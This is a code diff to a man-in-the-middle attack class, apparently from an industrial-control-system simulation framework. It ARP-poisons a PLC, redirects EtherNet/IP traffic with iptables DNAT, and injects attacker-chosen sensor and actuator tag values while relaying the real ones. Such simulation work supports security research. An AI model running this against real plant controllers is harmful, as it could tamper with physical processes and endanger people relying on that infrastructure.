@@ -4,17 +4,12 @@ import shlex
 import socket
 import subprocess
 import threading
-import ctypes
 import time
 from pathlib import Path
 from typing import List
 
 import fnfqueue
-from scapy.layers.inet import IP, TCP
-from scapy.packet import Raw
 
-from dhalsim.network_attacks.utilities import translate_float_to_payload, translate_payload_to_float
-from dhalsim.network_attacks.cip.cip import CIP
 from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp
 from synced_attack import SyncedAttack
 
@@ -46,51 +41,80 @@ class MitmAttack(SyncedAttack):
         # os.system('iptables -t nat -A POSTROUTING --destination 192.168.1.254 -j SNAT --to-source 192.168.1.1')
         # os.system('iptables -t nat -A POSTROUTING --destination 10.0.1.1/24 -j SNAT --to-source 192.168.1.1')
         # os.system('iptables -t nat -A POSTROUTING --destination 10.0.3.1/24 -j SNAT --to-source 192.168.1.1')
-        os.system(
-            'iptables -t nat -A PREROUTING -p tcp -d 192.168.1.1 --dport 44818 -j DNAT --to-destination 192.168.1.2:44818')
+        os.system('iptables -t nat -A PREROUTING -p tcp -d ' + self.target_plc_ip +
+                  ' --dport 44818 -j DNAT --to-destination ' + self.attacker_ip + ':44818')
         os.system('iptables -A FORWARD -p icmp -j DROP')
         os.system('iptables -A INPUT -p icmp -j DROP')
         os.system('iptables -A OUTPUT -p icmp -j DROP')
 
-        print("MITM 💻:", "ip:", socket.gethostbyname(socket.gethostname()))
 
-        cmd = shlex.split(
-            "/usr/bin/python2 -m cpppo.server.enip --print --address 192.168.1.2:44818 T2:1=REAL V_ER2i:1=REAL")
-        print("MITM 💻:", "server:", cmd)
+        cmd = shlex.split( '/usr/bin/python2 -m cpppo.server.enip --print --address ' +
+                           self.attacker_ip + ':44818 T2:1=REAL V_ER2i:1=REAL')
         self.server = subprocess.Popen(cmd, shell=False)
 
         self.run_thread = True
-        self.tags = {
-            "T2": 0.1234500000,
-            "V_ER2i": 1
-        }
+        self.tags = {}
         self.thread = threading.Thread(target=self.cpppo_thread)
         self.thread.start()
 
-        launch_arp_poison("192.168.1.1", "192.168.1.254")
+        launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
+
+    def receive_original_tags(self):
+        target_ip = self.intermediate_plc['local_ip']
+        request_tags = self.intermediate_plc['actuators'] + self.intermediate_plc['sensors']
+
+        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--address', str(target_ip) + ":44818"]
+
+        for tag in request_tags:
+            cmd.append(str(tag) + ':1')
+
+        try:
+            client = subprocess.Popen(cmd, shell=False, stdout=subprocess.PIPE)
+
+            # client.communicate is blocking
+            raw_out = client.communicate()
+
+            # Value is stored as first tuple element between a pair of square brackets
+            values = []
+            raw_string = raw_out[0]
+            split_string = raw_string.split(b"\n")
+            for word in split_string:
+                values.append(word[(word.find(b'[') + 1):word.find(b']')])
+            values.pop()
+
+            for idx, value in enumerate(values):
+                self.tags[request_tags[idx]] = value.decode()
+
+        except Exception as error:
+            print('ERROR enip _receive: ', error)
+
+    def update_tags_dict(self):
+        self.receive_original_tags()
+
+        for tag in self.intermediate_attack['tags']:
+            self.tags[tag['tag']] = tag['value']
 
     def make_client_cmd(self) -> List[str]:
-        # cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address',
-        #        str(self.intermediate_attack['local_ip'])]
-        #
-        # for tag in self.tags:
-        #     cmd.append(str(tag) + ':1=' + str(self.tags[tag]))
+        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address',
+               str(self.intermediate_attack['local_ip'])]
 
-        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address', '192.168.1.2',
-               'T2:1=0.1234500000000000', 'V_ER2i:1=1']
+        for tag in self.tags:
+            cmd.append(str(tag) + ':1=' + str(self.tags[tag]))
 
         return cmd
 
     def cpppo_thread(self):
-        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address', '192.168.1.2',
-               'T2:1=0.1234500000000000', 'V_ER2i:1=1']
         while self.run_thread:
+            self.update_tags_dict()
+            cmd = self.make_client_cmd()
+
             print("MITM 💻:", "client:", cmd)
             try:
                 client = subprocess.Popen(cmd, shell=False)
                 client.wait()
             except Exception as error:
                 print('ERROR enip _send multiple: ', error)
+            self.receive_original_tags()
             time.sleep(0.05)
 
     def interrupt(self):
@@ -98,7 +122,7 @@ class MitmAttack(SyncedAttack):
             self.teardown()
 
     def teardown(self):
-        restore_arp("192.168.1.1", "192.168.1.254")
+        restore_arp(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
 
         # Delete iptables rules
         os.system('iptables -D FORWARD -p icmp -j DROP')
